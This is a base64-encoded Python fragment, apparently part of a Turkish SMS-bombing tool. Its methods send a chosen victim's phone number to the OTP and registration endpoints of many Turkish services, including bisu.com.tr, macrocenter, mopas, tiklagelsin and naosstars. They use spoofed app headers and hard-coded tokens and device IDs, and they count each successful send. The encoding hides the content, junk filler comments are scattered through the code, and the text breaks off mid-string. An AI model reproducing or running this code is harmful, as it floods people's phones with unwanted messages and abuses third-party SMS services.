iAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CoyMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CowogICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CoyMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKCiAgICAjIGJpbmVxLnRlY2gKICAgIGRlZiBCaW5lcShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9iaW5lcWFwaS5oZXltb2JpbGl0eS50ZWNoOjQ0My9WMy8vYXBpL1VzZXIvQWN0aXZhdGlvbkNvZGVSZXF1ZXN0P29yZ2FuaXphdGlvbklkPTlEQ0EzMTJFLTE4QzgtNERBRS1BRTY1LTAxRkVBRDU1ODczOSZwaG9uZW51bWJlcj17c2VsZi5waG9uZX0iCiAgICAgICAgICAgIGhlYWRlciA9IHsiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiSEVZISUyMFNjb290ZXIvMTI4IENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLCAiQWNjZXB0LUxhbmd1YWdlIjogInRyIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcikKICAgICAgICAgICAgaWYgci5qc29uKClbIklzU3VjY2VzcyJdID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYmluZXFhcGkuaGV5bW9iaWxpdHkudGVjaCIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGJpbmVxYXBpLmhleW1vYmlsaXR5LnRlY2giKQoKICAgICMgYmlzdS5jb20udHIKICAgIGRlZiBCaXN1KHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vd3d3LmJpc3UuY29tLnRyOjQ0My9hcGkvdjIvYXBwL2F1dGhlbnRpY2F0aW9uL3Bob25lL3JlZ2lzdGVyIgogICAgICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PXV0Zi04IiwgIlgtRGV2aWNlLVBsYXRmb3JtIjogIklPUyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtQnVpbGQtVmVyc2lvbi1OYW1lIjogIjkuNC4wIiwgIkF1dGhvcml6YXRpb24iOiAiMDU2MWI0ZGQtZTY2OC00OGFjLWI2NWUtNWFmYTk5YmYwOThlIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1CdWlsZC1WZXJzaW9uLUNvZGUiOiAiMjIiLCAiQWNjZXB0IjogIiovKiIsICJYLURldmljZS1NYW51ZmFjdHVyZXIiOiAiQXBwbGUiLAogICAgICAgICAgICAgICAgICAgICAgICJYLURldmljZS1Mb2NhbGUiOiAiZW4iLCAiWC1DbGllbnQtRGV2aWNlLUlkIjogIjY2NTg1NjUzLUNCNkEtNDhDQS1BNDJELTNGMjY2Njc3RTNCNSIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtRGV2aWNlLVBsYXRmb3JtLVZlcnNpb24iOiAiMTUuNy43IiwKICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJCaVNVLzIyIENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLCAiWC1EZXZpY2UtTW9kZWwiOiAiaVBob25lIDcgUGx1cyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtQnVpbGQtVHlwZSI6ICJSZWxlYXNlIn0KICAgICAgICAgICAgZGF0YSA9IHsicGhvbmVOdW1iZXIiOiBzZWxmLnBob25lfQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQogICAgICAgICAgICBpZiByLmpzb24oKVsiZXJyb3JzIl0gPT0gTm9uZToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBiaXN1LmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGJpc3UuY29tLnRyIikKCiAgICAjIDM0NWRpaml0YWwuY29tCiAgICBkZWYgVWNkb3J0YmVzKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLjM0NWRpaml0YWwuY29tOjQ0My9hcGkvdXNlcnMvcmVnaXN0ZXIiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLCAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiQXJpUGx1c01vYmlsZS8yMSBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwgIkF1dGhvcml6YXRpb24iOiAibnVsbCIsICJDb25uZWN0aW9uIjogImNsb3NlIn0KICAgICAgICAgICAganNvbiA9IHsiZW1haWwiOiAiIiwgIm5hbWUiOiAiTWVtYXRpIiwgInBob25lTnVtYmVyIjogZiIrOTB7c2VsZi5waG9uZX0iLCAic3VybmFtZSI6ICJCYXMifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiByLmpzb24oKVsiZXJyb3IiXSA9PSAiRS1Qb3N0YSB2ZXlhIHRlbGVmb24gemF0ZW4ga2F5xLF0bMSxISI6CiAgICAgICAgICAgICAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CowogICAgICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgICAgICMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgICAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CowogICAgICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgICAgICMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgICAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CowogICAgICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgICAgICMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgICAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CowogICAgICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgICAgICMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgICAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CowogICAgICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgICAgICMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgICAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CoyMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBhcGkuMzQ1ZGlqaXRhbC5jb20iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBhcGkuMzQ1ZGlqaXRhbC5jb20iKQogICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQoKICAgICMgbWFjcm9jZW50ZXIuY29tLnRyCiAgICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7Co2Zhc2Rhc2Rhc2Zhc2YKICAgICMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjZ2FzZGdhc2RlZwogICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqNhZGdhc2RnYXNkZmFzZAogICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgIGRlZiBNYWNybyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3Jlc3QubWFjcm9jZW50ZXIuY29tLnRyOjQ0My91c2Vycy9sb2dpbi9vdHAiCiAgICAgICAgICAgICMjYWtzZmRqIGFsa3NmamFsa3dzZmEKICAgICAgICAgICAgaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAiWC1EZXZpY2UtUGxhdGZvcm0iOiAiSU9TIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1SZXF1ZXN0LUlkZW50aWZpZXIiOiAiMkMxQjZCQkItM0UxRS00RTdFLTlDQUUtOTkwQzZFQUFEMjc5IiwgIkFjY2VwdCI6ICIqLyoiLAogICAgICAgICAgICAgICAgICAgICAgICJYLURldmljZS1Nb2RlbCI6ICJpUGhvbmUgNyBQbHVzIiwgIlgtU3RvcmUtSWRzIjogIiIsICJYLURldmljZS1WZXJzaW9uIjogIjIuMy43IiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1EZXZpY2UtUGxhdGZvcm0tVmVyc2lvbiI6ICIxNS43LjciLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1hY3JvY2VudGVyLzE1IENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLAogICAgICAgICAgICAgICAgICAgICAgICJYLURldmljZS1JZGVudGlmaWVyIjogIkM3Q0Y5NTI1LTlCRUItNDdCMC04N0VGLUZBRkE5Rjc3OEMzRSIsICJYLURldmljZS1MYXRpdHVkZSI6ICIiLAogICAgICAgICAgICAgICAgICAgICAgICJYLURldmljZS1Mb25naXR1ZGUiOiAiIiwgIlgtRGV2aWNlLVR5cGUiOiAiTU9CSUxFIn0KICAgICAgICAgICAganNvbiA9IHsicGhvbmVOdW1iZXIiOiBzZWxmLnBob25lfQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiByLmpzb24oKVsic3VjY2Vzc2Z1bCJdID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gcmVzdC5tYWNyb2NlbnRlci5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiByZXN0Lm1hY3JvY2VudGVyLmNvbS50ciIpCgogICAgZGVmIE1vcGFzKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY29va2llcyA9IHsiSlNFU1NJT05JRCI6ICI2ODE3Mzc3MTI0QzY2NkFBNTlGM0U2QjA2NzhGMTI0QyJ9CiAgICAgICAgICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTA5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE1LjAiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQiOiAidGV4dC9wbGFpbiwgKi8qOyBxPTAuMDEiLCAiQWNjZXB0LUxhbmd1YWdlIjogInRyLVRSLHRyO3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiWC1SZXF1ZXN0ZWQtV2l0aCI6ICJYTUxIdHRwUmVxdWVzdCIsICJEbnQiOiAiMSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlJlZmVyZXIiOiAiaHR0cHM6Ly9tb3Bhcy5jb20udHIvbG9naW4iLCAiU2VjLUZldGNoLURlc3QiOiAiZW1wdHkiLCAiU2VjLUZldGNoLU1vZGUiOiAiY29ycyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlNlYy1GZXRjaC1TaXRlIjogInNhbWUtb3JpZ2luIiwgIlRlIjogInRyYWlsZXJzIiwgIkNvbm5lY3Rpb24iOiAiY2xvc2UifQogICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9tb3Bhcy5jb20udHIvc21zL2FjdGl2YXRpb24/bW9iaWxlTnVtYmVyPXtzZWxmLnBob25lfSZwd2Q9JmNoZWNrUHdkPSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcz1jb29raWVzLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IG1vcGFzLmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IG1vcGFzLmNvbS50ciIpCgogICAgIyB0aWtsYWdlbHNpbi5jb20KICAgIGRlZiBUaWtsYUdlbHNpbihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgICMjYWtzamRma2xhc2pmbGthc2YKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vc3ZjLmFwcHMudGlrbGFnZWxzaW4uY29tOjQ0My91c2VyL2dyYXBocWwiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIlgtTWVyY2hhbnQtVHlwZSI6ICIwIiwgIkFjY2VwdCI6ICIqLyoiLAogICAgICAgICAgICAgICAgICAgICAgICJBcHB2ZXJzaW9uIjogIjIuNC4xIiwgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtTm8tQXV0aCI6ICJ0cnVlIiwgIlVzZXItQWdlbnQiOiAiVGlrbGFHZWxzaW4vODA5IENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLAogICAgICAgICAgICAgICAgICAgICAgICJYLURldmljZS1UeXBlIjogIjIifQogICAgICAgICAgICBqc29uID0geyJvcGVyYXRpb25OYW1lIjogIkdFTkVSQVRFX09UUCIsCiAgICAgICAgICAgICAgICAgICAgInF1ZXJ5IjogIm11dGF0aW9uIEdFTkVSQVRFX09UUCgkcGhvbmU6IFN0cmluZywgJGNoYWxsZW5nZTogU3RyaW5nLCAkZGV2aWNlVW5pcXVlSWQ6IFN0cmluZykge1xuICBnZW5lcmF0ZU90cChwaG9uZTogJHBob25lLCBjaGFsbGVuZ2U6ICRjaGFsbGVuZ2UsIGRldmljZVVuaXF1ZUlkOiAkZGV2aWNlVW5pcXVlSWQpXG59XG4iLAogICAgICAgICAgICAgICAgICAgICJ2YXJpYWJsZXMiOiB7ImNoYWxsZW5nZSI6ICIzZDZmOWZmOS04NmNlLTRiZjMtOGJhOS00YTg1Y2E5NzVlNjgiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRldmljZVVuaXF1ZUlkIjogIjcyMDkzMkQ1LTQ3QkQtNDZDRC1BNEI4LTA4NkVDNDlGODFBQiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGhvbmUiOiBmIis5MHtzZWxmLnBob25lfSJ9fQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiByLmpzb24oKVsiZGF0YSJdWyJnZW5lcmF0ZU90cCJdID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gc3ZjLmFwcHMudGlrbGFnZWxzaW4uY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gc3ZjLmFwcHMudGlrbGFnZWxzaW4uY29tIikKCiAgICAjIGF5eWlsZGl6LmNvbS50cgogICAgZGVmIEF5eWlsZGl6KHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gZiJodHRwczovL2FwaS5hbHRpbnlpbGRpemNsYXNzaWNzLmNvbTo0NDMvbW9iaWxlYXBpMi9hdXRhcGkvQ3JlYXRlU21zT3RwRm9yUmVnaXN0ZXI/Z3NtPXtzZWxmLnBob25lfSIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogIiovKiIsCiAgICAgICAgICAgICAgICAgICAgICAgIlRva2VuIjogIk1YWjVOVEo4MldYQlVKQjdLQlAxMEFHUjNBRjZTNEdCOTVWWkRVNEc0NEpGRUlOM1dJU0FDMktMUklCTk9OUTdRVkNaWE0zWkhJNjYxQU1WWExLSkxGOUhVS0k1U1EyUk9NWlMiLAogICAgICAgICAgICAgICAgICAgICAgICJEZXZpY2V0eXBlIjogIm1vYmlsZWFwcCIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiYWx0aW55aWxkaXovMi43IChjb20uYnJtYWdhemFjaWxpay5hbHRpbnlpbGRpejsgYnVpbGQ6MjsgaU9TIDE1LjcuNykgQWxhbW9maXJlLzIuNyIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1UUjtxPTEuMCwgdHItVFI7cT0wLjkifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgaWYgci5qc29uKClbIlN1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGFwaS5hbHRpbnlpbGRpemNsYXNzaWNzLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwaS5hbHRpbnlpbGRpemNsYXNzaWNzLmNvbSIpCgogICAgIyBuYW9zc3RhcnMuY29tCiAgICBkZWYgTmFvc3N0YXJzKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLm5hb3NzdGFycy5jb206NDQzL2FwaS9zbXNTZW5kLzljOWZhODYxLWNjNWQtNDNiMC1iNGVhLTFiNTQxYmUxNTM1MCIKICAgICAgICAgICAgaGVhZGVycyA9IHsiVW5pcWlkIjogIjljOWZhODYxLWNjNWQtNDNjMC1iNGVhLTFiNTQxYmUxNTM1MSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAibmFvc3N0YXJzLzEuMDAzMCBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luIjogIioiLCAiTG9jYWxlIjogImVuLVRSIiwgIlZlcnNpb24iOiAiMS4wMDMwIiwgIk9zIjogImlvcyIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFwaXVybCI6ICJodHRwczovL2FwaS5uYW9zc3RhcnMuY29tL2FwaS8iLCAiRGV2aWNlLUlkIjogIkQ0MUNFNUYzLTUzQkItNDJDRi04NjExLUI0RkU3NTI5QzlCQyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlBsYXRmb3JtIjogImlvcyIsICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiVGltZXpvbmUiOiAiRXVyb3BlL0lzdGFuYnVsIiwKICAgICAgICAgICAgICAgICAgICAgICAiR2xvYmFsdXVpZHY0IjogImQ1N2JkNWQyLWNmMWUtNDIwYy1iNDNkLTYxMTE3Y2Y5YjUxNyIsICJUaW1lem9uZW9mZnNldCI6ICItMTgwIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24iLCAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsICJBcGl0eXBlIjogIm1vYmlsZV9hcHAifQogICAgICAgICAgICBqc29uID0geyJ0ZWxlcGhvbmUiOiBmIis5MHtzZWxmLnBob25lfSIsICJ0eXBlIjogInJlZ2lzdGVyIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLm5hb3NzdGFycy5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBhcGkubmFvc3N0YXJzLmNvbSIpCgogICAgIyBpc3RlZ2Vsc2luLmNvbQogICAgZGVmIElzdGVnZWxzaW4oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9wcm9kLmZhc2FwaS5uZXQ6NDQzLyIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogIiovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwgIkFwcC1WZXJzaW9uIjogIjI1MjgiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsICJQbGF0Zm9ybSI6ICJJT1MiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogImlnLXNvbmt1bGxhbmljaS1pb3MvMTYxIENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkifQogICAgICAgICAgICBqc29uID0geyJvcGVyYXRpb25OYW1lIjogIlNlbmRPdHAyIiwKICAgICAgICAgICAgICAgICAgICAicXVlcnkiOiAibXV0YXRpb24gU2VuZE90cDIoJHBob25lTnVtYmVyOiBTdHJpbmchKSB7XG4gIHNlbmRPdHAyKHBob25lTnVtYmVyOiAkcGhvbmVOdW1iZXIpIHtcbiAgICBfX3R5cGVuYW1lXG4gICAgYWxyZWFkeVNlbnRcbiAgICByZW1haW5pbmdUaW1lXG4gIH1